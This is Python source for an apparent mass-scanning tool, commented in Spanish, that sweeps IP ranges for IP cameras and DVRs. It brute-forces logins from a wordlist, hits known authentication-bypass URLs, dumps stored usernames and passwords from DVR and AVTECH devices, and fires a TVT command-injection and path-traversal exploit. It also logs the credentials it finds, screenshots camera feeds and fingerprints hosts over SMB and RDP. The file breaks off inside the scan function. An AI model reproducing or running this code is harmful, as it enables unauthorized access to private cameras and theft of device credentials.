import fnmatch
import queue
import ipaddress
import threading
from threading import Lock
import subprocess
import socket
import time
import requests
import os
import base64
import sys
import json
import re  # Importamos la librería 're' para las expresiones regulares
from bs4 import BeautifulSoup
from scapy.all import IP, TCP, sr
from urllib.parse import urlsplit
import random
from colorama import init, Fore, Style
from tqdm import tqdm
from requests.exceptions import RequestException, ConnectionError, Timeout  # tiempo errores
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from fake_useragent import UserAgent
import concurrent.futures
#LIBRERIAS-NUEVAS-SMB
from impacket import smb3, ntlm
from collections import OrderedDict
import datetime
import command

def clear():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

ports_por_defecto = [
    554, 8554, 5900, 8500, 8002, 9554, 6034, 9039, 6036, 60826, 8012, 39007, 60245, 58002, 10554,
    60485, 8154, 8156, 60047, 60388, 54789, 1024, 1025, 1026, 60682, 60742, 7554, 6554, 3139,
    60441, 3554, 550, 551, 552, 554 ,555, 556, 3123, 8553, 2554, 60889, 1050, 1051, 1052
]

#ports_por_defecto = [
#    80, 90, 100, 443, 445, 8080, 81, 82, 83, 84, 88, 8010, 1813, 8181, 8000, 8001, 9000, 21, 23, 22, 25, 53, 161, 101,
#    137, 138, 139, 2002, 2082, 2083, 5000, 5001, 6001, 6002, 6003, 5002, 37777, 5540, 5900, 3306, 3389, 2051, 8002,
#    8554, 8002, 8200, 8280, 8834, 88, 8002, 9000, 7000,
#    8500, 8554, 1024, 10554, 1025, 555, 1554, 8002, 9002, 82, 88, 2554, 5540, 6036, 8021, 8553, 51235
#]

trozos_puerto = []  # Variable global para almacenar los trozos de puertos

def GenerarPuertos():
    global trozos_puerto
    puertos_todos = range(1, 65536)
    tamanio_trozo = 1024  # Tamaño del trozo ajustable según la memoria disponible
    trozos_puerto = [list(puertos_todos[i:i+tamanio_trozo]) for i in range(0, len(puertos_todos), tamanio_trozo)]
    
    # Limpia los trozos de puerto dentro de GenerarPuertos
    def LimpiarTrozosPuerto():
        global trozos_puerto
        while True:
            time.sleep(1)
            trozos_puerto = []
    
    # Iniciar el hilo de limpieza
    limpiar_thread = threading.Thread(target=LimpiarTrozosPuerto)
    limpiar_thread.daemon = True
    limpiar_thread.start()
    
    # Actualizar los puertos según los argumentos proporcionados
    if command.args.port and "all" in command.args.port:
        ports = list(puertos_todos)
    elif command.args.port:
        ports = [int(puerto) for puerto in command.args.port]
    else:
        ports = ports_por_defecto
    
    return ports

ports = GenerarPuertos()

# Limpiar la pantalla (se asume que la función clear() está definida)
clear()

# Inicializar variables
processed_ips = 0
num_stars = command.ip_pattern.count('*')
threads = []
ip_queue = queue.Queue()
last_index = 0

# Verificar si se proporciona una IP para reanudar
if command.reanudar_ip:
    # Buscar la IP de reanudación en la cola
    while not ip_queue.empty():
        current_ip = ip_queue.get()
        last_index += 1
        ip_queue.put(current_ip)
        if current_ip == command.reanudar_ip:
            break

    # Iterar sobre posibles valores para las partes del patrón con comodines
    for i in range(last_index, 256**num_stars):
        parts = [i // (256**j) % 256 for j in range(num_stars)][::-1]
        ip = command.ip_pattern.replace('*', '{}').format(*parts)

        if last_index > 0:
            ip_queue.put(ip)
        elif ip == command.reanudar_ip:
            last_index += 1
            ip_queue.put(ip)
            
if command.salto is not None and command.salto != 0:
    # Resto del código para la generación de IPs con command.salto
    for i in range(0, 256**num_stars, command.salto):
        parts = [i // (256**j) % 256 for j in range(num_stars)][::-1]
        ip = command.ip_pattern.replace('*', '{}').format(*parts)
        ip_queue.put(ip)
else:
    for i in range(0, 256**num_stars):
        parts = [i // (256**j) % 256 for j in range(num_stars)][::-1]
        ip = command.ip_pattern.replace('*', '{}').format(*parts)
        ip_queue.put(ip)

def is_camera(ip, port, banner, services):
    try:
        banner_lower = banner.lower()  # Convertir solo una vez a minúsculas
        services_lower = services.lower()  # Convertir solo una vez a minúsculas

        # Condiciones específicas
        if "rtsp/1.0 400 method not allowed" in banner_lower and "etag:" in banner_lower:
            return "Camara-RTSP"
        if "rtsp/1.0 400 bad request" in banner_lower and "etag:" in banner_lower:
            return "Camara-RTSP"
        if "webs" in banner_lower and "etag:" in banner_lower:
            return "Camara-Hikvision/DVR"
        if "ipcam" in banner_lower:
            return "Camara-IPCAM"
        if "http/1.0 401 unauthorized" in banner_lower:
            return "401-Probando_BruteForce"
        if 'www-authenticate: basic realm="index.html"' in banner_lower:
            return "Camara-Autenticacion-401"
        if "camera:" in banner_lower or "model:" in banner_lower:
            return "Camara-Found"
        if "http/1.0 302 found" in banner_lower:
            return "Camara[?]"
        if "/doc/page/login.asp?_" in banner_lower:
            return "Camara-Hikvision/DVR"
        if "-//w3c//dtd xhtml 1.0 transitional//en" in banner_lower:
            return "Camara-IPCAM"
        if 'www-authenticate: basic realm="streaming_server"' in banner_lower:
            return "Camara-Autenticacion-401"
        if "server: hipcam realserver/v1.0" in banner_lower:
            return "Camara-Hipcam"
        if "network camera with pan/tilt" in banner_lower:
            return "Camara-Network"
        if "boa/0.94.14rc21" in banner_lower:
            return "Camara-Found"
        if any(kw in banner_lower for kw in ["plugin:", "expires:", "activex", "rtsp"]):
            return "Camara-Found"
        if "rtsp" in services_lower:
            return "Camara-Found"
        if "unknown" in banner_lower:
            return "unknown"

        return False
    except Exception as e:
        print(f"Error en is_camera: {e}")
        return False


# Define your filter criteria (command.FiltroRegion and command.FiltroCiudad) here

exploit_checks = [
    "/System/deviceInfo?auth=YWRtaW46MTEK",
    "/onvif-http/snapshot?auth=YWRtaW46MTEK",
    "/ISAPI/Image/channels/1/ircutFilter"
]

def is_vulnerable(ip, port, exploit_checks):
    link = f"http://{ip}:{port}"
    try:
        for exploit_check in exploit_checks:
            x = requests.get(f'{link}{exploit_check}', timeout=3)
            if x.status_code == 200:
                return True
        return False
    except Exception:
        return False

class Colors:
    GREEN = '\033[92m'
    ORANGE = '\033[93m'
    DEFAULT = '\033[0m'
    RED = '\033[91m'
    YELLOW = '\033[93m'


def enviar_solicitud_individual(ip, port, url, carga_cancelada, resultados):
    for usuario, contraseña in usuarios.items():
        try:
            credentials = base64.b64encode(f'{usuario}:{contraseña}'.encode('utf-8')).decode('utf-8')
            
            headers = {
                'Authorization': f'Basic {credentials}',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'es-ES,es;q=0.9',
                'Connection': 'close'
            }

            response = requests.get(url, headers=headers, stream=True, timeout=0.5)
            response.raise_for_status()

            if response.status_code == 200:
                manejar_respuesta(ip, port, url, response, usuario, contraseña, carga_cancelada, resultados)

                # Detener la exploración después de encontrar la primera vulnerabilidad
                if len(resultados) > 0:
                    return
            else:
                pass

        except requests.exceptions.RequestException:
            resultados.append(None)

def enviar_solicitud(ip, port, carga_cancelada, resultados):
    urls = [
        f'http://{ip}:{port}/video.mjpg',
        f'http://{ip}:{port}/cgi-bin/viewer/video.jpg',
        f'http://{ip}:{port}/onvif/Media',
        f'http://{ip}:{port}/System/configurationFile?auth=YWRtaW46MTEK',
        f'http://{ip}:{port}/pda.htm',
        f'http://{ip}:{port}/main.htm',
        f'http://{ip}:{port}/video.cgi?',
        f'http://{ip}:{port}/web/mobile.html',
        f'http://{ip}:{port}/asp/video.cgi'
        f'http://{ip}:{port}/serverpush.htm'
    ]

    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = [executor.submit(enviar_solicitud_individual, ip, port, url, carga_cancelada, resultados) for url in set(urls)]
        concurrent.futures.wait(futures)

usuarios = {}

# Cargar el wordlist desde el archivo de texto si se proporciona
if command.args.w:
    with open(command.args.w, 'r') as file:
        for line in file:
            key, value = line.strip().split(':')
            usuarios[key] = value


def manejar_respuesta(ip, port, url, response, usuario, contraseña, carga_cancelada, resultados):
    for chunk in response.iter_content(chunk_size=1024):
        if carga_cancelada.is_set():
            break

    if response.status_code == 200:
        resultados.append({'url': url, 'usuario': usuario, 'contraseña': contraseña})
        if len(resultados) <= 1:
            print(Colors.GREEN + f'[+] Posible-Vulnerabilidad en {url}' + Colors.DEFAULT)
            guardar_url(ip, port, url, "Usuario:NO", "Contraseña:NO")
        if len(resultados) <= 4:
            print(Colors.YELLOW + 'Falso Positivo' + Colors.DEFAULT)
        else:
            print(Colors.GREEN + f'[+] Posible-Vulnerabilidad en {url} con usuario {usuario} y contraseña {contraseña}.' + Colors.DEFAULT)
            capture_screenshot(ip, port, usuario=usuario, contraseña=contraseña)
            guardar_url(ip, port, url, usuario, contraseña)

            
# Modifica la función guardar_url para incluir el usuario y la contraseña
def guardar_url(ip, port, url, usuario, contraseña):
    with open('Vulnerabilidades_Camaras.txt', 'a') as file:
        file.write(f'IP: {ip}, Port: {port}, URL: {url}, Usuario: {usuario}, Contraseña: {contraseña}\n')


def cancelar_carga(carga_cancelada):
    carga_cancelada.set()

def verificar_respuesta_200(ip, port, tiempo_cancelacion=0.1):
    carga_cancelada = threading.Event()
    resultados = []

    with concurrent.futures.ThreadPoolExecutor() as executor:
        futuro_solicitud = executor.submit(enviar_solicitud, ip, port, carga_cancelada, resultados)

        try:
            resultado = futuro_solicitud.result(timeout=tiempo_cancelacion)
        except concurrent.futures.TimeoutError:
            carga_cancelada.set()
            resultado = False

    if resultado:
        print(Colors.RED + 'Direccionamiento-Unknown' + Colors.DEFAULT)

# Función para escanear credenciales del DVR
def scan_dvr_credentials(ip, port):
    fullHost_1 = f"http://{ip}:{port}/device.rsp?opt=user&cmd=list"

    def makeReqHeaders(xCookie):
        headers = {
            "Host": f"{ip}:{port}",
            "User-Agent": "Morzilla/7.0 (911; Pinux x86_128; rv:9743.0)",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "es-AR,en-US;q=0.7,en;q=0.3",
            "Connection": "close",
            "Content-Type": "text/html",
            "Cookie": f"uid={xCookie}"
        }
        return headers

    try:
        rX = requests.get(fullHost_1, headers=makeReqHeaders(xCookie="admin"), timeout=10.0)
        rX.raise_for_status()  # Raise an exception for non-2xx HTTP status codes
    except Exception as e:
        print(Colors.RED + " [+] Tiempo de espera agotado: " + str(e) + Colors.DEFAULT)
        return "No se pudieron obtener credenciales: " + str(e)

    badJson = rX.text
    if not badJson:
        print(Colors.RED + " [+] No se encontraron credenciales o no es vulnerable" + Colors.DEFAULT)
        return "No se encontraron credenciales o No vulnerable"

    try:
        dataJson = json.loads(badJson)
        totUsr = len(dataJson["list"])
    except Exception as e:
        print(Colors.RED + " [+] Error al analizar JSON: " + str(e) + Colors.DEFAULT)
        return "Error al analizar JSON: " + str(e)
    
    print(Colors.GREEN + "\n [+] DVR (url):\t\t" + Colors.ORANGE + f"http://{ip}:{port}/" + Colors.GREEN)
    print(" [+] Port: \t\t" + Colors.ORANGE + str(port) + Colors.DEFAULT)
    print(Colors.GREEN + "\n [+] Users List:\t" + Colors.ORANGE + str(totUsr) + Colors.DEFAULT)
    print(" ")

    credentials_list = []

    if totUsr > 0:
        print(Colors.GREEN + " [+] Credenciales Encontradas:" + Colors.DEFAULT)
        for obj in range(0, totUsr):
            _usuario = dataJson["list"][obj]["uid"]
            _password = dataJson["list"][obj]["pwd"]
            _role = dataJson["list"][obj]["role"]
            print(f" - User: {_usuario}, Password: {_password}, Role: {_role}")
            credentials_list.append(f"Usuario: {_usuario}, Contraseña: {_password}, Rol: {_role}")
        return credentials_list
    else:
        print(Colors.RED + " [+] No se encontraron credenciales." + Colors.DEFAULT)
        return "No se encontraron credenciales."

def is_valid_ip(ip):
    try:
        socket.inet_pton(socket.AF_INET, ip)
        return True
    except socket.error:
        return False


def extract_domain(ip):
    try:
        domain = socket.gethostbyaddr(ip)[0]
        return domain
    except socket.herror:
        return "N/A"

def get_response_body(ip, port, endpoint):
    domain = extract_domain(ip)
    url = f"http://{domain}:{port}{endpoint}"
    
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            response_body = response.text
            #print(f"Response Body: {response_body}")  # Print the response body
            return response_body
        else:
            return "N/A"
    except requests.exceptions.RequestException:
        return "N/A"

def check_vuln_hikvision(ip, port):
    url = f"http://{ip}:{port}/"

    try:
        data = requests.get(url)
        if data.status_code != 200:
            print(Colors.RED + f"[{ip}:{port}] - NO-VULNERABLE (Code: {data.status_code})" + Colors.DEFAULT)
            return None

        data = requests.get(url + "/doc/page/login.asp")
        if data.status_code == 404:
            print(Colors.RED + f"[{ip}:{port}] - no se parece a Hikvision" + Colors.DEFAULT)
            return None

        data = requests.get(url + "c")
        if data.status_code != 200:
            if data.status_code == 500:
                print(Colors.RED + f"[{ip}:{port}] - no se pudo verificar si era vulnerable (Code: {data.status_code})" + Colors.DEFAULT)
                return None
            else:
                print(Colors.RED + f"[{ip}:{port}] - NO-VULNERABLE (Code: {data.status_code})" + Colors.DEFAULT)
                return None

        print(Colors.GREEN + f"[{ip}:{port}] - Posible-Vulnerabilidad-Hikvision" + Colors.DEFAULT)
        # You can perform any additional actions here if the host is vulnerable.
        return True
    except requests.exceptions.RequestException as e:
        print(f"[{ip}:{port}] - request error: {e}")
        return None


def check_vuln_avtech(ip, port, etype=1):
    url = f"http://{ip}:{port}/cgi-bin/user/Config.cgi?/nobody&action=get&category=Account.*"

    if etype == 2:
        url = f"http://{ip}:{port}/cgi-bin/user/Config.cgi?.cab&action=get&category=Account."

    try:
        response = requests.get(url, headers={
            "User-Agent": random.choice(user_agents)
        }, timeout=5)
    except requests.exceptions.ConnectionError:
        print(f"[{ip}:{port}] - connection error")
        return None
    except requests.exceptions.ReadTimeout:
        print(f"[{ip}:{port}] - timeout error")
        return None

    if "Account.Maxuser" in response.text:
        try:
            user_username = response.text.split("User1.Username=")[1].split("\n")[0]
            user_password = response.text.split("User1.Password=")[1].split("\n")[0]
        except IndexError:
            print(Colors.RED + f"[{ip}:{port}] - NO-VULNERABLE (Code: {response.status_code})" + Colors.DEFAULT)
            return None

        print(Colors.GREEN + f"[{ip}:{port}] - Posible-Vulnerabilidad-Hikvision" + Colors.DEFAULT)
        # You can perform any additional actions here if the host is vulnerable.
        return True

    else:
        print(Colors.RED + f"[{ip}:{port}] - NO-VULNERABLE (Code: {response.status_code})" + Colors.DEFAULT)
        if etype == 1:
            check_vuln_avtech(ip, port, 2)
        return None

def raw_url_request(url):
    try:
        response = requests.get(url, timeout=5)
        return response
    except requests.exceptions.ConnectionError:
        return None
    except requests.exceptions.Timeout:
        return None

def check_vuln_tvt(ip, port):
    IFS = ' '
    try:
        raw_url_request(f"http://{ip}:{port}/language/Swedish${IFS}&&echo${IFS}1>test&&tar${IFS}/string.js")
        response = raw_url_request(f"http://{ip}:{port}/../../../../../../../mnt/mtd/test")
        raw_url_request(f"http://{ip}:{port}/language/Swedish${IFS}&&rm${IFS}test&&tar${IFS}/string.js")
    except (ConnectionError, Timeout) as e:
        print(Colors.RED + f"[{ip}:{port}] - Conexion/Agotada error" + Colors.DEFAULT)
        return False
    if response.text[0] != '1':
        print(Colors.RED + f"[{ip}:{port}] - NO-VULNERABLE (Code: {response.status_code})" + Colors.DEFAULT)
        return False

    print(Colors.GREEN + f"[{ip}:{port}] - Posible Exploit" + Colors.DEFAULT)
    return True

def capture_screenshot(ip, port, usuario=None, contraseña=None):
    try:
        url = f"http://{ip}:{port}"

        # Autenticarse si se proporcionan credenciales
        if usuario is not None and contraseña is not None:
            auth = (usuario, contraseña)
        else:
            auth = None

        session = requests.Session()
        response = session.get(url, auth=auth, timeout=5)

        if not response.ok and response.status_code != 401:
            pass

        chrome_options = webdriver.ChromeOptions()
        chrome_options.add_argument('--headless')
        chrome_options.add_argument('--disable-notifications')
        chrome_options.add_argument('--log-level=3')
        chrome_options.add_argument('--disable-dev-shm-usage')

        driver = webdriver.Chrome(options=chrome_options)
        driver.get(url)

        # Esperar a que la página se cargue completamente
        driver.implicitly_wait(10)

        screenshot_filename = f"screenshot/{ip}-{port}.png"
        driver.save_screenshot(screenshot_filename)
        return("has_screenshot:true")

    except requests.RequestException as e:
        pass

    except Exception as e:
        pass

    finally:
        if 'driver' in locals() and driver is not None:
            driver.quit()

lock = Lock()

def GuardarDatos(data):
    try:
        lock.acquire()

        tamanio_actual = 0
        existing_data = []

        if os.path.isfile("datos.json"):
            tamanio_actual = os.path.getsize("datos.json")
            with open("datos.json", 'r', encoding='utf-8') as file:
                existing_data = json.load(file)

        existing_data.append(data)
        json_data = json.dumps(existing_data, indent=4)

        #respaldo
        try:
            with open("respaldo.json", "w", encoding='utf-8') as backup_file:
                backup_file.write(json_data)
        except Exception as backup_exception:
            print(f"Error al realizar respaldo: {backup_exception}")

        #Guarda en "datos.json"
        try:
            with open("datos.json", "w", encoding='utf-8') as file:
                file.write(json_data)
        except Exception as write_exception:
            print(f"Error al escribir en datos.json: {write_exception}")

    except Exception as e:
        print(f"Error general: {e}")
        try:
            with open("respaldo.json", "r", encoding='utf-8') as backup_file:
                restored_data = json.load(backup_file)
                
            with open("datos.json", "w", encoding='utf-8') as file:
                file.write(json.dumps(restored_data, indent=4))
                
            print("Datos restaurados desde el respaldo.")
        except Exception as restore_exception:
            print(f"No se pudo restaurar desde el respaldo: {restore_exception}")

    finally:
        lock.release()

def os_detection(target, port=3389):
    # Envía paquetes TCP SYN a los puertos especificados sin detección de hosts/Tiene_Fallos[Mejorar]
    packet = IP(dst=target) / TCP(dport=port, flags="S")
    responses, _ = sr(packet, timeout=10, verbose=0)

    # Analiza las respuestas
    for response in responses:
        #print(f"Respuesta recibida: {repr(response)}")
        if response[1].haslayer(TCP):
            #print(f"TTL: {response[1].ttl}")
            #print(f"IP de origen: {response[1].src}")
            #print(f"IP de destino: {response[1].dst}")
            #print(f"Números de puerto: {response[1][TCP].sport} -> {response[1][TCP].dport}")
            #print(f"Flags TCP: {response[1][TCP].sprintf('%TCP.flags%')}")
            payload_hex = response[1].load.hex()
            #print(f"Carga útil en hexadecimal: {payload_hex}")
        if response[1][TCP].flags == 0x12 or response[1][TCP].flags == 0x10:
            if response[1][TCP].options:
                #win7 ttl=113
                #win10 ttl=119
                window_detect = response[1][TCP].window #w10=64000,w8.1=64000, XP=65535, w7=8192,64240
                ttl_detect = response[1][IP].ttl
                for option in response[1][TCP].options:
                    if ((option[0] == 'MSS' and option[1] == 1412) and
                            (window_detect == 64000) and
                            ((113 < ttl_detect < 118) or (112 < ttl_detect < 128)) and
                            (ttl_detect != 115) and (window_detect != 65535)):
                        print(f"OS: Windows 10")
                        return(f"Windows 10")
                    
                    elif (option[0] == 'MSS' and option[1] == 1412 and
                          window_detect == 64000 and
                          114 < ttl_detect < 119):
                        print(f"OS: Windows 8")
                        return(f"Windows 8")
                    
                    elif (((option[0] == 'MSS' and option[1] == 1412) or
                          (option[0] == 'MSS' and option[1] == 1380)) and
                          ((window_detect == 8192) or (window_detect == 1460) or (window_detect == 64240)) and
                          (0 < ttl_detect < 218)):
                        print(f"OS: Windows 7")
                        return(f"Windows 7")
                    
                    elif ((((option[0] == 'MSS' and option[1] == 1412) or
                           (option[0] == 'MSS' and option[1] == 1380)) and
                           ((window_detect == 65535) or (window_detect == 1460) or (window_detect == 64240))) and
                           (0 < ttl_detect < 116) or (0 < ttl_detect < 114)) and ttl_detect != 108:
                        print(f"OS: Windows XP")
                        return(f"Windows XP")
                else:
                    #print("No se encontraron opciones en la respuesta.")
                    # Cerrar la conexión
                    return False
            elif response[1][TCP].flags == 0x14:  # TCP RST-ACK
                #print(f"El puerto {port} está cerrado en {target}.")
                return False
            # Cerrar la conexión para otros casos
            return False
        else:
            # Cerrar la conexión para otros casos
            return False

def decode_string(byte_string):
  return byte_string.decode('UTF-8').replace('\x00', '')

def decode_int(byte_string):
  return int.from_bytes(byte_string, 'little')

def parse_version(version_bytes):
  
  major_version = version_bytes[0]
  minor_version = version_bytes[1]
  product_build = decode_int(version_bytes[2:4])

  version = 'Unknown'

  if major_version == 5 and minor_version == 1:
    version = 'Windows XP (SP2)'
  elif major_version == 5 and minor_version == 2:
    version = 'Server 2003'
  elif major_version == 6 and minor_version == 0:
    version = 'Server 2008 / Windows Vista'
  elif major_version == 6 and minor_version == 1:
    version = 'Server 2008 R2 / Windows 7'
  elif major_version == 6 and minor_version == 2:
    version = 'Server 2012 / Windows 8'
  elif major_version == 6 and minor_version == 3:
    version = 'Server 2012 R2 / Windows 8.1'
  elif major_version == 10 and minor_version == 0:
    version = 'Server 2016 or 2019 / Windows 10'

  return '{} (build {})'.format(version, product_build)

def parse_negotiate_flags(negotiate_flags_int):

  flags = OrderedDict()

  flags['NTLMSSP_NEGOTIATE_UNICODE']                  = 0x00000001
  flags['NTLM_NEGOTIATE_OEM']                         = 0x00000002
  flags['NTLMSSP_REQUEST_TARGET']                     = 0x00000004
  flags['UNUSED_10']                                  = 0x00000008
  flags['NTLMSSP_NEGOTIATE_SIGN']                     = 0x00000010
  flags['NTLMSSP_NEGOTIATE_SEAL']                     = 0x00000020
  flags['NTLMSSP_NEGOTIATE_DATAGRAM']                 = 0x00000040
  flags['NTLMSSP_NEGOTIATE_LM_KEY']                   = 0x00000080
  flags['UNUSED_9']                                   = 0x00000100
  flags['NTLMSSP_NEGOTIATE_NTLM']                     = 0x00000400
  flags['UNUSED_8']                                   = 0x00000400
  flags['NTLMSSP_ANONYMOUS']                          = 0x00000800
  flags['NTLMSSP_NEGOTIATE_OEM_DOMAIN_SUPPLIED']      = 0x00001000
  flags['NTLMSSP_NEGOTIATE_OEM_WORKSTATION_SUPPLIED'] = 0x00002000
  flags['UNUSED_7']                                   = 0x00004000
  flags['NTLMSSP_NEGOTIATE_ALWAYS_SIGN']              = 0x00008000
  flags['NTLMSSP_TARGET_TYPE_DOMAIN']                 = 0x00010000
  flags['NTLMSSP_TARGET_TYPE_SERVER']                 = 0x00020000
  flags['UNUSED_6']                                   = 0x00040000
  flags['NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY'] = 0x00080000
  flags['NTLMSSP_NEGOTIATE_IDENTIFY']                 = 0x00100000
  flags['UNUSED_5']                                   = 0x00200000
  flags['NTLMSSP_REQUEST_NON_NT_SESSION_KEY']         = 0x00400000
  flags['NTLMSSP_NEGOTIATE_TARGET_INFO']              = 0x00800000
  flags['UNUSED_4']                                   = 0x01000000
  flags['NTLMSSP_NEGOTIATE_VERSION']                  = 0x02000000
  flags['UNUSED_3']                                   = 0x10000000
  flags['UNUSED_2']                                   = 0x08000000
  flags['UNUSED_1']                                   = 0x04000000
  flags['NTLMSSP_NEGOTIATE_128']                      = 0x20000000
  flags['NTLMSSP_NEGOTIATE_KEY_EXCH']                 = 0x40000000
  flags['NTLMSSP_NEGOTIATE_56']                       = 0x80000000

  negotiate_flags = []

  for name,value in flags.items():
    if negotiate_flags_int & value:
      negotiate_flags.append(name)

  return negotiate_flags

def check(ip, port=445):
    try:
        # Conectar usando SMBv3
        smb_client = smb3.SMB3(ip, ip, sess_port=port)
        time.sleep(5)
        resp_token = request_SMBv23(smb_client)
        return parse_challenge(resp_token)
    except Exception as e:
        return f"Error al verificar {ip}:{port}: {str(e)}"

def request_SMBv23(smb_client):
    session_setup = smb3.SMB2SessionSetup()

    blob = smb3.SPNEGO_NegTokenInit()
    blob['MechTypes'] = [smb3.TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']]

    auth = ntlm.getNTLMSSPType1(smb_client._Connection['ClientName'], '',
                                smb_client._Connection['RequireSigning'])
    blob['MechToken'] = auth.getData()

    session_setup['SecurityMode'] = smb3.SMB2_NEGOTIATE_SIGNING_REQUIRED if smb_client.RequireMessageSigning else smb3.SMB2_NEGOTIATE_SIGNING_ENABLED
    session_setup['Flags'] = 0
    session_setup['SecurityBufferLength'] = len(blob)
    session_setup['Buffer'] = blob.getData()

    packet = smb_client.SMB_PACKET()
    packet['Command'] = smb3.SMB2_SESSION_SETUP
    packet['Data'] = session_setup

    packet_id = smb_client.sendSMB(packet)
    smb_response = smb_client.recvSMB(packet_id)

    if smb_response.isValidAnswer(smb3.STATUS_MORE_PROCESSING_REQUIRED):
        session_setup_response = smb3.SMB2SessionSetup_Response(smb_response['Data'])
        resp_token = smb3.SPNEGO_NegTokenResp(session_setup_response['Buffer'])
        return resp_token['ResponseToken']
    else:
        return None

def parse_target_info(target_info_bytes):

  MsvAvEOL             = 0x0000
  MsvAvNbComputerName  = 0x0001
  MsvAvNbDomainName    = 0x0002
  MsvAvDnsComputerName = 0x0003
  MsvAvDnsDomainName   = 0x0004
  MsvAvDnsTreeName     = 0x0005
  MsvAvFlags           = 0x0006
  MsvAvTimestamp       = 0x0007
  MsvAvSingleHost      = 0x0008
  MsvAvTargetName      = 0x0009
  MsvAvChannelBindings = 0x000A

  target_info = OrderedDict()
  info_offset = 0

  while info_offset < len(target_info_bytes):
    av_id = decode_int(target_info_bytes[info_offset:info_offset+2])
    av_len = decode_int(target_info_bytes[info_offset+2:info_offset+4])
    av_value = target_info_bytes[info_offset+4:info_offset+4+av_len]
    
    info_offset = info_offset + 4 + av_len
    
    if av_id == MsvAvEOL:
      pass
    elif av_id == MsvAvNbComputerName:
      target_info['MsvAvNbComputerName'] = decode_string(av_value)
    elif av_id == MsvAvNbDomainName:
      target_info['MsvAvNbDomainName'] = decode_string(av_value)
    elif av_id == MsvAvDnsComputerName:
      target_info['MsvAvDnsComputerName'] = decode_string(av_value)
    elif av_id == MsvAvDnsDomainName:
      target_info['MsvAvDnsDomainName'] = decode_string(av_value)
    elif av_id == MsvAvDnsTreeName:
      target_info['MsvAvDnsTreeName'] = decode_string(av_value)
    elif av_id == MsvAvFlags:
      pass
    elif av_id == MsvAvTimestamp:
      filetime = decode_int(av_value)
      microseconds = (filetime - 116444736000000000) / 10
      time = datetime.datetime(1970, 1, 1) + datetime.timedelta(microseconds = microseconds)
      target_info['MsvAvTimestamp'] = time.strftime("%b %d, %Y %H:%M:%S.%f")
    elif av_id == MsvAvSingleHost:
      target_info['MsvAvSingleHost'] = decode_string(av_value)
    elif av_id == MsvAvTargetName:
      target_info['MsvAvTargetName'] = decode_string(av_value)
    elif av_id == MsvAvChannelBindings:
      target_info['MsvAvChannelBindings'] = av_value

  return target_info

def parse_challenge(challenge_message):

  # Signature
  signature = decode_string(challenge_message[0:7]) # b'NTLMSSP\x00' --> NTLMSSP

  # MessageType
  message_type = decode_int(challenge_message[8:12]) # b'\x02\x00\x00\x00' --> 2

  # TargetNameFields
  target_name_fields  = challenge_message[12:20]
  target_name_len     = decode_int(target_name_fields[0:2])
  target_name_max_len = decode_int(target_name_fields[2:4])
  target_name_offset  = decode_int(target_name_fields[4:8])

  # NegotiateFlags
  negotiate_flags_int = decode_int(challenge_message[20:24])

  negotiate_flags = parse_negotiate_flags(negotiate_flags_int)

  # ServerChallenge
  server_challenge = challenge_message[24:32]

  # Reserved
  reserved = challenge_message[32:40]

  # TargetInfoFields
  target_info_fields  = challenge_message[40:48]
  target_info_len     = decode_int(target_info_fields[0:2])
  target_info_max_len = decode_int(target_info_fields[2:4])
  target_info_offset  = decode_int(target_info_fields[4:8])

  # Version
  version_bytes = challenge_message[48:56]
  version = parse_version(version_bytes)

  # TargetName
  target_name = challenge_message[target_name_offset:target_name_offset+target_name_len]
  target_name = decode_string(target_name)

  # TargetInfo
  target_info_bytes = challenge_message[target_info_offset:target_info_offset+target_info_len]

  target_info = parse_target_info(target_info_bytes)

  return {
    'target_name': target_name,
    'version': version,
    'target_info': target_info,
    'negotiate_flags': negotiate_flags
  }

lock = threading.Lock()

def scan(ip, ports):
    PURPLE = "\033[35m"
    if not is_valid_ip(ip):
        ip_list = search_and_display_titles(ip)
        if ip_list is not None:
            for ip in ip_list:
                # Realiza operaciones con la lista de direcciones IP
                pass
        else:
            print("No se encontraron direcciones IP válidas.")
            
    with lock:
        bar.update(1)

    futures = []
    with concurrent.futures.ThreadPoolExecutor() as executor:
        for port in ports:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                    sock.settimeout(command.args.s)

                    result = sock.connect_ex((ip, port))
                    if result != 0:
                        futures.append(executor.submit(ip, ports[0]))
                        continue
                    
                    banner = get_banner(ip, port)

                    try:
                        service_name = socket.getservbyport(port)
                    except OSError:
                        service_name = "unknown"
                    region, city, country = get_location(ip)

                    # Extract the domain name from the IP
                    domain = extract_domain(ip)

                    # Get the response body from the service
                    response_body = get_response_body(ip, port, '/some_endpoint_here')  # Cambiar '/some_endpoint_here' al endpoint real
                    hikvision_vulnerable, avtech_vulnerable, tvt_vulnerable, cam = False, False, False, False

                    # Check if the region and city match the filters
                    if (command.FiltroRegion and region == command.FiltroRegion) or (command.FiltroCiudad and city == command.FiltroCiudad) or (command.FiltroCiudad is None and command.FiltroRegion is None):
                        formatted_ip = f"{Fore.YELLOW}{ip}{Style.RESET_ALL}:{Fore.YELLOW}{port}{Style.RESET_ALL}"
                        formatted_service_name = f"{Fore.YELLOW}{service_name}{Style.RESET_ALL}"
                        formatted_banner = f"{Fore.CYAN}{banner}{Style.RESET_ALL}"
                        formatted_region = f"{Fore.YELLOW}{region}{Style.RESET_ALL}"
                        formatted_city = f"{Fore.YELLOW}{city}{Style.RESET_ALL}"
                        formatted_domain = f"{Fore.YELLOW}{domain}{Style.RESET_ALL}"

                        print(f"IP: {formatted_ip}\nServicio: {formatted_service_name}\nBanner: {formatted_banner}\nRegión: {formatted_region}\nCiudad: {formatted_city}\nDominio: {formatted_domain}")

                        #VARIABLE INICIADA EN NULL
                        credentials_found = "NULL"
                        screenshot = "NULL"
                        # Detecta el sistema por RDP
